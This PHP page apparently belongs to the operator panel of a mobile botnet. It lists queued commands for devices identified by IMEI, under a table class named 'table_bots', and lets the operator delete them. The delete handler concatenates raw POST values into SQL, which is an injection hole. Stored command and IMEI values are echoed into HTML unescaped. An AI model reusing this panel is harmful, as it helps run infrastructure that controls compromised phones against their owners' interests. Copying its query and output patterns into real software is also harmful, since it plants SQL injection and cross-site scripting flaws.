<div class="content">
<table align="center" class="header_table_commands" border="1" cellspacing="0" cellpadding="0" width=100%'>
	<thead class="header_table_commands">	
	    <th></th>
		<th>ID</th>
		<th>IMEI</th>	
		<th>Команда</th>
	</thead>
	
	<?php
		include 'config.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
        $sql = "SELECT * FROM commands";
		$booleanIMEI = false;

		//*****Обработка запросa Для удаления!
		if(isset($_POST["delete"]))
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				foreach($_POST["checks"] as $id)
				{
					$id_del = $id; 
					$sql2 = "DELETE FROM commands WHERE id='".$id_del."'";
					$connection->query($sql2);
				}
			}
				header ('Location: /index.php?cont=commands');
		}
		
		//******батоны и переменые с базы!********
	    echo "<form method='post'>";
		echo "<input type='submit' value='Удалить' name='delete' class='submit'/>";
		echo "<p id='text_command'> Команды в очереди</p>";
		
		foreach($connection->query($sql) as $row)
		{
			$ID = $row['id'];
			$IMEI = $row['IMEI'];
			$command = $row['command'];

			//************Данные в таблице********************************************
			echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><input type=checkbox name=checks[] value=$ID></input></td>
				<td>$ID</td>
				<td>$IMEI</td>
				<td>$command</td>
				</tr>";
		}
		 echo "</form>";

		//	id 	IMEI 	command 	
		?>

</table>
</div>